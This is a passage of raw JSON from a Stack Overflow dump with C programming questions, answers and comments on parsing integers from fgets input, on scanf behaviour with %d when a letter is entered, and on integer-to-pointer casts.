you think it is CR?? That&#39;s just the return-key, which is the same on all systems! Actually MacOS before X used <code>CR</code>."}, {"owner": {"reputation": 45919, "user_id": 4996248, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/IUaWZ.jpg?s=128&g=1", "display_name": "John Coleman", "link": "https://stackoverflow.com/users/4996248/john-coleman"}, "edited": false, "score": 1, "creation_date": 1497985160, "post_id": 44660782, "comment_id": 76307513, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/7021725/converting-string-to-integer-c\">Converting string to integer C</a>"}, {"owner": {"reputation": 2685, "user_id": 7479696, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/12ea7cffb9e02b31267bbacaca12b469?s=128&d=identicon&r=PG&f=1", "display_name": "Vidor Vistrom", "link": "https://stackoverflow.com/users/7479696/vidor-vistrom"}, "edited": false, "score": 0, "creation_date": 1497985751, "post_id": 44660782, "comment_id": 76307848, "body": "using strtoul() may be helpful"}, {"owner": {"reputation": 5751, "user_id": 1101692, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0207bd98c9e3f6f855d82aff720437aa?s=128&d=identicon&r=PG", "display_name": "Shark", "link": "https://stackoverflow.com/users/1101692/shark"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1497990709, "post_id": 44660782, "comment_id": 76310586, "body": "@Olaf fair enough, I just know there&#39;s a difference between the three in CRLF (windows), CR(mac) and LF (unix). I somewhat remember those two being <code>10, 13</code> but I could be wrong."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 5751, "user_id": 1101692, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0207bd98c9e3f6f855d82aff720437aa?s=128&d=identicon&r=PG", "display_name": "Shark", "link": "https://stackoverflow.com/users/1101692/shark"}, "edited": false, "score": 0, "creation_date": 1497990952, "post_id": 44660782, "comment_id": 76310756, "body": "@Shark: Quite simple: all good hosted environments are POSIX-based and Unix. They don&#39;t need to differentiate between &quot;text&quot; and &quot;binary&quot; file mode for open. All POSIX systems use <code>&#39;\\n&#39;</code> as line seperator (and <code>&#39;&#47;&#39;</code>) for directories, btw). Only one hosted environment went riot for stupid reasons (back in the old times the extra byte was indeed quite expensive to store): DOS. And the offspring of DOS is WinDOS ;-) (and now they are already searching for pointy stones \u2026)"}], "answers": [{"comments": [{"owner": {"reputation": 45919, "user_id": 4996248, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/IUaWZ.jpg?s=128&g=1", "display_name": "John Coleman", "link": "https://stackoverflow.com/users/4996248/john-coleman"}, "edited": false, "score": 0, "creation_date": 1497986947, "post_id": 44661106, "comment_id": 76308506, "body": "On Windows the code should work as well. <code>stdin</code> is open in text mode as a default and in text mode Window&#39;s 2-character line endings are automatically replaced by <code>\\n</code>. Even if this weren&#39;t the case, <code>atoi</code> would ignore the trailing white space."}], "tags": [], "owner": {"reputation": 15167, "user_id": 16827, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/xMFTQ.png?s=128&g=1", "display_name": "Remo.D", "link": "https://stackoverflow.com/users/16827/remo-d"}, "is_accepted": false, "score": 2, "last_activity_date": 1497991855, "last_edit_date": 1497991855, "creation_date": 1497985386, "answer_id": 44661106, "question_id": 44660782, "link": "https://stackoverflow.com/questions/44660782/unable-to-extract-full-number-from-string-in-c-program/44661106#44661106", "title": "Unable to extract full number from string in C program", "body": "<p>I believe it could be helpful to layout <code>user_data</code> after the <code>fgets()</code> of \"23\" (assuming Linux or Mac new line):</p>\n\n<pre><code> +-----+-----+----+----+\n | '2' | '3' | \\n | \\0 | .....\n +-----+-----+----+----+\n    0     1     2    3 \n</code></pre>\n\n<p>Note that <code>user_data[0]</code> does <strong>not</strong> contain 2 (the number 2)! It contains '2' (the character '2') whose code is (again, assuming Linux) 0x32 (in hex or 50 in decimal).</p>\n\n<p>This is why your attempt to print the values of <code>user_data[]</code> have not been fruitful: you were trying to print the <em>representation</em> of the number, not the number itself.</p>\n\n<p>To convert that string to the integer it represents, you can do something like:</p>\n\n<pre><code> num = atoi(user_data)\n</code></pre>\n\n<p>The function <code>atoi()</code> does the work for you. A more flexible function is <code>strtol()</code> which does the same but for <code>long int</code> (and also can handle string that represents numbers in a base that is not 10).</p>\n\n<p>I hope this answers to your question: <em>How to extract the full number from user_data?</em></p>\n\n<p>There are some other points where you should clean up and simplify your code, but you can open another question in case you need help.</p>\n"}, {"tags": [], "owner": {"reputation": 2685, "user_id": 7479696, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/12ea7cffb9e02b31267bbacaca12b469?s=128&d=identicon&r=PG&f=1", "display_name": "Vidor Vistrom", "link": "https://stackoverflow.com/users/7479696/vidor-vistrom"}, "is_accepted": false, "score": 0, "last_activity_date": 1497995738, "last_edit_date": 1497995738, "creation_date": 1497994837, "answer_id": 44663492, "question_id": 44660782, "link": "https://stackoverflow.com/questions/44660782/unable-to-extract-full-number-from-string-in-c-program/44663492#44663492", "title": "Unable to extract full number from string in C program", "body": "<p>Try this:</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n\n\nint main(void)\n{\n   int i;\n\n   char user_data[100];\n\n   long int sum = 0;\n\n   double average;\n\n   unsigned int numbers_count = 0;\n\n   for( i=0; i&lt;= 99; ++i)\n   user_data[i] = 0;\n\n   unsigned int numbers[100];\n\n   for( i=0; i&lt;= 99; ++i)\n        numbers[i] = 0;\n\n   printf(\"Please enter the numbers:\");\n\n   fgets(user_data,sizeof(user_data),stdin);\n    //int p=0;//use with strtol(see further code)\n    i = 0;\n    int j;//this will store each number in numbers array.. so this is also the count of numbers stored - 1\n\n\n    for(j=0;;){\n\n        for(i=0;i&lt;strlen(user_data);i++)\n        {\n            if(user_data[i]=='\\n'){\n                    break;\n            }\n            if(user_data[i]==' '){\n                    j++;\n                    i++;\n                    //p=i;//to be used with strtol\n            }\n            numbers[j]=(numbers[j]*10)+((user_data[i]-48));//alternatively use =&gt; numbers[j]=strtol(user_data+p,NULL,10);\n\n        }\n\n        break;\n    }\n\n    i = 0;\n\n    while( i&lt;=j)\n    {\n        sum += numbers[i];\n        ++i;\n    }\n\n    average = (float)sum/(j+1);\n\n\n    printf(\"\\n\\nAverage of the entered numbers is: %f\",average);\n\n\n    return 0;\n}\n</code></pre>\n\n<hr>\n\n<p>Sample input </p>\n\n<blockquote>\n  <p>10 11 12</p>\n</blockquote>\n\n<p>Sample output</p>\n\n<blockquote>\n  <p>11.00000000</p>\n</blockquote>\n\n<hr>\n\n<p>I have shown two approaches to solve this:</p>\n\n<ul>\n<li>One is straight-forward, subtract 48 from each char and add it to numbers array(ASCII manipulation) .</li>\n<li>Other is to use strtol. Now strtol converts the number pointed by the char pointer(char array in this case) until the next char is not a number. So use pointer arithmetic to point to further numbers(like here I have added p(yeah I know p is not a good variable name, so does i and j!)).</li>\n<li>There are more ways to solve like using atoi library functions. </li>\n</ul>\n"}, {"tags": [], "owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "is_accepted": false, "score": 0, "last_activity_date": 1498076272, "last_edit_date": 1498076272, "creation_date": 1498074715, "answer_id": 44685141, "question_id": 44660782, "link": "https://stackoverflow.com/questions/44660782/unable-to-extract-full-number-from-string-in-c-program/44685141#44685141", "title": "Unable to extract full number from string in C program", "body": "<p>regarding the posted code:</p>\n\n<p>what happens if one of the numbers is zero?</p>\n\n<p>What happens if the sum of the numbers exceeds the capacity of 'sum'</p>\n\n<pre><code>#include &lt;stdio.h&gt;    // sscanf(), fgets(), printf()\n#include &lt;stdlib.h&gt;   // strtol()\n#include &lt;string.h&gt;   // strtok()\n\n// eliminate the 'magic' number by giving it a meaningful name\n#define MAX_INPUTS 100\nint main(void) \n{\n    // the array can be initialized upon declaration\n    // which eliminates the 'for()' loop to initialize it\n    // char user_data[100];\n    // and\n    // initialization not actually needed as \n    // the call to 'fgets()' will overlay the array\n    // and 'fgets()' always appends a NUL byte '\\0'\n    char user_data[ MAX_INPUTS ];\n    long int sum = 0;\n    double average;\n\n    // following variable not needed\n    // unsigned int numbers_count = 0;\n\n    // following code block not needed when\n    // 'user_data[]' initialized at declaration\n    // for (int i = 0; i &lt;= 99; ++i)\n    //    user_data[i] = 0;\n\n    // not needed, see other comments\n    //unsigned int numbers[100];\n\n    // not needed, as 'numbers' is eliminated\n    // for (int i = 0; i &lt;= 99; ++i)\n    //    numbers[i] = 0;\n\n    printf(\"Please enter the numbers:\");\n\n    // should be checking the returned value\n    // to assure it is not NULL \n    // And\n    // this call to 'fgets()' is expecting \n    // all the numbers to be on a single input line\n    // so that could be a problem\n    fgets(user_data, sizeof(user_data), stdin);\n\n    // the following two code blocks will not extract the numbers\n    // for a number of reasons including that 'sscanf()'\n    // does not advance through the 'user_data[]' array\n    // int i = 0;\n    // while (user_data[i] != 0) {\n    //     sscanf(user_data, \"%u\", &amp;numbers[i]);\n    //     ++i;\n    // }\n\n    // i = 0;\n    // while (numbers[i] != 0) {\n    //     sum += numbers[i];\n    //     ++i;\n    // }\n\n    // suggest the following, \n    // which also eliminates the need for 'numbers[]'\n    // note: the literal \" \\n\" has both a space and a newline\n    //     because the user is expected to enter numbers, \n    //     separated by a space and \n    //     'fgets()' also inputs the newline\n    int i = 0;\n    char *token = strtok( user_data, \" \\n\");\n    while( token )\n    {\n        // not everyone likes 'atoi()'\n        // mostly because there is no indication of any error event\n        // suggest using: 'strtol()'\n        //sum += atoi( token );  \n        sum += strtol( token, NULL, 10 ) // could add error checking           \n        i++;\n        token = strtok( NULL, \" \\n\" );\n    }\n\n    // the value assigned to 'numbers_count' \n    // is already available in 'i'\n    // suggest eliminate the following code block \n    // and \n    // eliminate the 'numbers_count' variable\n    // i = 0;\n    // while (numbers[i] != 0) {\n    //    ++numbers_count;\n    //    ++i;\n    // }\n\n\n    // 'average' is declared as a 'double', \n    // so the casting should be to 'double'\n    // and \n    // if incorporating the prior comment about 'numbers_count'\n    // average = (float)sum / (float)numbers_count;\n    average = (double)sum / (double)i'\n\n    // to have the text immediately displayed on the terminal\n    // place a '\\n' at the end of the format string.\n    // without adding the '\\n' the text only displays \n    // as the program exits\n    // printf(\"\\n\\nAverage of the entered numbers is: %f\",average);\n    printf(\"\\n\\nAverage of the entered numbers is: %f\\n\",average);\n\n    return 0;\n} // end function: main\n</code></pre>\n"}], "owner": {"reputation": 5, "user_id": 6495409, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/c2dafe0f07d425dd5b2d1948e5b08333?s=128&d=identicon&r=PG&f=1", "display_name": "Muneeb", "link": "https://stackoverflow.com/users/6495409/muneeb"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 114, "favorite_count": 0, "answer_count": 3, "score": -1, "last_activity_date": 1498076272, "creation_date": 1497984183, "last_edit_date": 1497995175, "question_id": 44660782, "link": "https://stackoverflow.com/questions/44660782/unable-to-extract-full-number-from-string-in-c-program", "title": "Unable to extract full number from string in C program", "body": "<p><strong>Program to calculate the average of n numbers given by the user.</strong></p>\n\n<p>Okay so I have this program whose purpose is what you have read above. Its output is not quite right. I figured out what the problem is but couldn't find the solution as I am not a leet at programming (newbie actually). Here is the code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(void) {\n    char user_data[100];\n    long int sum = 0;\n    double average;\n    unsigned int numbers_count = 0;\n\n    for (int i = 0; i &lt;= 99; ++i)\n        user_data[i] = 0;\n\n    unsigned int numbers[100];\n\n    for (int i = 0; i &lt;= 99; ++i)\n        numbers[i] = 0;\n\n    printf(\"Please enter the numbers:\");\n\n    fgets(user_data, sizeof(user_data), stdin);\n\n    int i = 0;\n    while (user_data[i] != 0) {\n        sscanf(user_data, \"%u\", &amp;numbers[i]);\n        ++i;\n    }\n\n    i = 0;\n    while (numbers[i] != 0) {\n        sum += numbers[i];\n        ++i;\n    }\n\n    i = 0;\n    while (numbers[i] != 0) {\n        ++numbers_count;\n        ++i;\n    }\n\n    average = (float)sum / (float)numbers_count;\n\n    printf(\"\\n\\nAverage of the entered numbers is: %f\",average);\n\n    return 0;\n}\n</code></pre>\n\n<p>Now here comes the problem.</p>\n\n<p>When I enter an integer say <code>23</code>, it gets stored into the <code>user_data</code> in two separate bytes. I added a loop to print the values of <code>user_data[i]</code> to figure out what was wrong.</p>\n\n<pre><code>    i = 0;\n    while (i &lt;= 99) {\n        printf(\"%c\\n\",user_data[i]);\n        ++i;\n    }`\n</code></pre>\n\n<p>and the result was this</p>\n\n<p><a href=\"https://i.stack.imgur.com/uDSuM.png\" rel=\"nofollow noreferrer\">user_data insight</a></p>\n\n<p>This was the first problem, here comes the second one.\nI added another loop same like the above one to print the numbers stored in numbers[100] and figure out what was wrong and here is the output. Here's a sample</p>\n\n<p><a href=\"https://i.stack.imgur.com/Ev6Ba.png\" rel=\"nofollow noreferrer\">numbers stored in numbers[]</a></p>\n\n<p><strong>Now my main question is</strong></p>\n\n<p>How to extract the full number from <code>user_data</code>?</p>\n"}, {"tags": ["c", "format", "scanf"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 2, "creation_date": 1497983552, "post_id": 44660548, "comment_id": 76306518, "body": "Short story: If the input doesn&#39;t match the format then <a href=\"http://en.cppreference.com/w/c/io/fscanf\" rel=\"nofollow noreferrer\"><code>scanf</code></a> returns early (check what the call returns! always!) leaving the input still in the buffer."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1497983627, "post_id": 44660548, "comment_id": 76306564, "body": "In the background (actually in right in front of you, but you ignore it) scanf tells you that it did not successfully read an integer. The return value carries that information."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 3, "creation_date": 1497983716, "post_id": 44660548, "comment_id": 76306613, "body": "<code>&quot;%d&quot;</code> expects numeric input like <code>(white-spaces)(sign)[digits]</code>.  If the user does not type that, nothing is read and text remains in <code>stdin</code> for the next input function - With your code, bad input leads to an endless loop as the offending text is never consumed."}, {"owner": {"reputation": 1138, "user_id": 8082942, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/39e453fc810fab5a6d369713d1d60ce8?s=128&d=identicon&r=PG&f=1", "display_name": "anon", "link": "https://stackoverflow.com/users/8082942/anon"}, "edited": false, "score": 0, "creation_date": 1497983738, "post_id": 44660548, "comment_id": 76306633, "body": "%d will not read characters. You will need to use %c for that."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1497984125, "post_id": 44660548, "comment_id": 76306871, "body": "&quot;if input a char&quot; ---&gt; Tip: By &quot;char&quot;, I think you mean letters. In C, a <code>char</code> is a type of 1 byte.  <code>scanf()</code> does not read char, but <i>characters</i>.  Some <i>characters</i> are letters, digits, punctuation, controls, etc."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1497984281, "post_id": 44660548, "comment_id": 76306978, "body": "So you intentionally invoke undefined behaviour and wonder why you see undefined behaviour \u2026 Good question, you are only the 100000th asker. Didn&#39;t the other 99999 provide the exact answer you want to see?"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1497985498, "post_id": 44660548, "comment_id": 76307686, "body": "<i>I would like to know what happens in the background</i> - As for any undefined behavior - the implementation does not bother to handle these cases, so you get some residuals and junk from the other processing."}, {"owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "edited": false, "score": 0, "creation_date": 1497988631, "post_id": 44660548, "comment_id": 76309486, "body": "&quot;I hope the type specifier should convert it to an equivalent int value.&quot;  But as The Man in Black said, &quot;Prepare to be disappointed.&quot;  When you have <code>int x = &#39;c&#39;;</code>, then yes, C will automatically convert the character to an integer for you.  But that&#39;s in an an ordinary assignment.  When you &#39;re using <code>scanf</code> and a <code>%d</code> format, on the other hand, such a conversion is simply <i>not</i> performed."}], "answers": [{"comments": [{"owner": {"reputation": 109, "user_id": 2102777, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d7ab1a4d916de54f8e1e5bfb000c8e1?s=128&d=identicon&r=PG&f=1", "display_name": "leosf6308", "link": "https://stackoverflow.com/users/2102777/leosf6308"}, "edited": false, "score": 0, "creation_date": 1497984428, "post_id": 44660768, "comment_id": 76307074, "body": "Hey chux, how did you link to programmer dude comment?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1497984449, "post_id": 44660768, "comment_id": 76307085, "body": "Note: <code>if(scanf(&quot;%d&quot;, &amp;a) == 1)</code> has the advantage with more complex formats like <code>scanf(&quot;xyz%d&quot;, &amp;a)</code> which may return 0,1,EOF."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1497984505, "post_id": 44660768, "comment_id": 76307121, "body": "Right click on comment&#39;s timestamp to get a link.  BTW, looks like you have been visited by a serial down-voter."}, {"owner": {"reputation": 109, "user_id": 2102777, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d7ab1a4d916de54f8e1e5bfb000c8e1?s=128&d=identicon&r=PG&f=1", "display_name": "leosf6308", "link": "https://stackoverflow.com/users/2102777/leosf6308"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1497984765, "post_id": 44660768, "comment_id": 76307283, "body": "Oh, thanks @chux, I never did check parameter count. I&#39;ll update my answer."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1497985159, "post_id": 44660768, "comment_id": 76307512, "body": "&quot;returned EOF, keeping the a variable untouched.&quot; may be technically wrong.  Should a rare input error occur (e.g. broken KB wire), <code>EOF</code> is returned and the state of <code>a</code> may be unknown.  I have not found the C spec on that, but in general, best not to count on the state of <code>a</code> when an input error occurs."}], "tags": [], "owner": {"reputation": 109, "user_id": 2102777, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d7ab1a4d916de54f8e1e5bfb000c8e1?s=128&d=identicon&r=PG&f=1", "display_name": "leosf6308", "link": "https://stackoverflow.com/users/2102777/leosf6308"}, "is_accepted": true, "score": 4, "last_activity_date": 1497985043, "last_edit_date": 1497985043, "creation_date": 1497984123, "answer_id": 44660768, "question_id": 44660548, "link": "https://stackoverflow.com/questions/44660548/scanf-a-char-using-d/44660768#44660768", "title": "Scanf a char using %d", "body": "<p>You may check scanf as <a href=\"https://stackoverflow.com/questions/44660548/scanf-a-char-using-d#comment76306518_44660548\">@Some programmer dude</a>. You may compare the count arguments succesfully filled (Thanks to <a href=\"https://stackoverflow.com/questions/44660548/scanf-a-char-using-d/44660768?noredirect=1#comment76307085_44660768\">@chux</a>)</p>\n\n<p>In your case, scanf didn't find any integer value, reached the end of the input and returned EOF, keeping the <code>a</code> variable untouched.</p>\n\n<p>On failure it'll return EOF (read <a href=\"http://www.cplusplus.com/reference/cstdio/scanf/#return\" rel=\"noreferrer\">http://www.cplusplus.com/reference/cstdio/scanf/#return</a>).</p>\n\n<pre><code>if(scanf(\"%d\", &amp;a) == 1) //Check if exactly one parameter was read. \n    printf(\"entered number is %d\\n\", a);\n</code></pre>\n\n<p>For characters, you better use <code>getch()</code> or at least, ask for <code>\"%c\"</code> on scanf:</p>\n\n<pre><code>if(scanf(\"%c\", &amp;a) == 1)\n    printf(\"entered key was %d\\n\", a);\n</code></pre>\n\n<p>The \"junk\" value you recieve is what was in your program memory, because <code>a</code> is not initialized.</p>\n"}], "owner": {"reputation": 77, "user_id": 3162607, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/02e34ffa74698311e0f37e00005deb8f?s=128&d=identicon&r=PG", "display_name": "geek", "link": "https://stackoverflow.com/users/3162607/geek"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3021, "favorite_count": 1, "accepted_answer_id": 44660768, "answer_count": 1, "score": 1, "last_activity_date": 1528371546, "creation_date": 1497983327, "question_id": 44660548, "link": "https://stackoverflow.com/questions/44660548/scanf-a-char-using-d", "title": "Scanf a char using %d", "body": "<p>I have a specific example below, which works perfectly fine if integers are inputted (see output1), when I try to scan a char using %d specifier in scanf function call I get the output2 below.</p>\n\n<p>So, my question is if input a char I hope the type specifier should convert it to an equivalent int value, if not a junk value, even in the either case it should print/segfault. But, here I'm getting continuous prints which I feel is wrong as scanf is getting bypassed every single time. I'm pretty unsure what's happening in the background and would like to know the same.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n\n   int a;\n\n   while (1){\n       printf(\"enter a number:\");\n       scanf(\"%d\", &amp;a);\n       printf(\"entered number is %d\\n\", a);\n   }\n\nreturn 0;\n}\n</code></pre>\n\n<p><strong>Output1</strong>:</p>\n\n<pre><code>&gt;     enter a number:1\n&gt;     entered number is 1\n&gt;     enter a number:\n&gt;     3\n&gt;     entered number is 3\n&gt;     enter a number:4\n&gt;     entered number is 4\n&gt;     enter a number:5\n&gt;     entered number is 5 enter a number:\n</code></pre>\n\n<p><strong>Output2</strong>: for input a</p>\n\n<pre><code>&gt;     enter a number:entered number is 32767\n&gt;     enter a number:entered number is 32767\n&gt;     enter a number:entered number is 32767\n&gt;     enter a number:entered number is 32767\n&gt;     enter a number:entered number is 32767\n&gt;     enter a number:entered number is 32767\n&gt;     enter a number:entered number is 32767\n&gt;     enter a number:entered number is 32767\n&gt;     enter a number:entered number is 32767\n</code></pre>\n\n<p>PS: I know this is a stupid question of asking what happens in an invalid case where a type specifier unintended (%d in this case) is used for different type, but I would like to know what happens in the background, if any. Thanks</p>\n"}, {"tags": ["c", "pointers", "casting"], "comments": [{"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1497983364, "post_id": 44660529, "comment_id": 76306415, "body": "Except for a literal <code>0</code>, casting an integer to a pointer is implementation-dependent."}, {"owner": {"reputation": 39159, "user_id": 1541563, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/U4EOh.png?s=128&g=1", "display_name": "Patrick Roberts", "link": "https://stackoverflow.com/users/1541563/patrick-roberts"}, "edited": false, "score": 0, "creation_date": 1497983371, "post_id": 44660529, "comment_id": 76306419, "body": "No, it&#39;s saying the 10th address available to the program. Chances are, it&#39;s pointing at garbage or something you do not want to mess with though."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 39159, "user_id": 1541563, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/U4EOh.png?s=128&g=1", "display_name": "Patrick Roberts", "link": "https://stackoverflow.com/users/1541563/patrick-roberts"}, "edited": false, "score": 4, "creation_date": 1497983578, "post_id": 44660529, "comment_id": 76306532, "body": "@PatrickRoberts: That&#39;s wrong!"}, {"owner": {"reputation": 39159, "user_id": 1541563, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/U4EOh.png?s=128&g=1", "display_name": "Patrick Roberts", "link": "https://stackoverflow.com/users/1541563/patrick-roberts"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1497984951, "post_id": 44660529, "comment_id": 76307384, "body": "@Olaf not really.. assuming your program doesn&#39;t segfault when you dereference <code>p</code>, it would attempt to read the data at the 10th address of the program as an <code>int</code>. <a href=\"https://codegolf.stackexchange.com/a/122136/42091\">Check out this wizardry that uses this mechanic</a>. In that case a multi-character <code>char</code> constant is being implicitly converted to a <code>char *</code> but it&#39;s the same concept, i.e. the literal value becomes the address location."}, {"owner": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "edited": false, "score": 1, "creation_date": 1497985243, "post_id": 44660529, "comment_id": 76307548, "body": "You are not going to get a good beginner&#39;s explanation of pointers on this site, because it wouldn&#39;t fit into the answer box, even if anyone wanted to write one. At best you&#39;re going to get a hyper-pedantic answer that leaves you more confused than you already were. Go to your friendly local public library and ask the librarian for an introductory C textbook.  It doesn&#39;t matter which one."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 39159, "user_id": 1541563, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/U4EOh.png?s=128&g=1", "display_name": "Patrick Roberts", "link": "https://stackoverflow.com/users/1541563/patrick-roberts"}, "edited": false, "score": 2, "creation_date": 1497985373, "post_id": 44660529, "comment_id": 76307624, "body": "@PatrickRoberts: Please provide a referrence to the standard. Conversion of an integer to a pointer is implementation defined. Typically it is the absolute address, not relative to the program (which section? <code>.data</code>? <code>.bss</code>? <code>.text</code>?) And show the definition of &quot;garbage&quot; there is nothing like that in the standard. Actually dereferencing a pointer which does not point to an object invokes UB. That&#39;s all we can assume from the sparse information given."}, {"owner": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "reply_to_user": {"reputation": 39159, "user_id": 1541563, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/U4EOh.png?s=128&g=1", "display_name": "Patrick Roberts", "link": "https://stackoverflow.com/users/1541563/patrick-roberts"}, "edited": false, "score": 0, "creation_date": 1497985490, "post_id": 44660529, "comment_id": 76307679, "body": "@PatrickRoberts <i>You</i> get the pedantic answer: The effect of <code>int *p = (int *)10;</code> is implementation-defined, which means it will do <i>something</i> predictable on each implementation you try it on -- it&#39;s not allowed to trigger the nasal demons -- now, if you <i>dereference</i> that pointer, all bets are off -- but there is no expectation that it will be the same thing on any two implementations."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", 